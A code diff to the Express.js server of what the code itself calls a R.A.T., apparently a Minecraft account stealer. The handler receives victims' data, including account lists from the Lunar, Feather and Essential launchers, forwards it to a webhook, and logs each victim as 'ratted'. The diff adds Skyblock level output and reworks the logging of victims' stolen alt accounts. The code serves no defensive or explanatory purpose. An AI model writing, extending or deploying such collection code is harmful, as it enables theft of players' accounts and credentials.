@@ -173,7 +173,8 @@ app.post("/", (req, res) => {
 
         if (profileData) {
             for (let profileId in profileData.profiles) {
-                profiles += `${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`
+                console.log(profileData.profiles[profileId])
+                profiles += `[${profileData.profiles[profileId].sblvl}] ${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`
             }
         }
 
@@ -215,11 +216,6 @@ app.post("/", (req, res) => {
             lunarAccounts = Object.values(JSON.parse(req.body.lunar).accounts).map(account => account.username)
         }
         
-
-        console.log(`\`\`\`${featherAccounts.join('\n')}\`\`\``)
-        console.log(`\`\`\`${essentialAccounts.join('\n')}\`\`\``)
-        console.log(`\`\`\`${lunarAccounts.join('\n')}\`\`\``)
-
         try {
             post(webhook, JSON.stringify({
                 content: content, //ping
@@ -295,8 +291,7 @@ app.post("/", (req, res) => {
         } catch (e) {
             console.log(e)
         }
-
-        console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
+        console.log(`[R.A.T] ${req.body.username} has been ratted!\nThe alts beeing ${lunarAccounts.join(' ')} ${essentialAccounts.join(' ')} ${lunarAccounts.join(' ')}\n${JSON.stringify(req.body)}`)
     })
         .catch(err => {
         //could happen if the auth server is down OR if invalid information is passed in the body
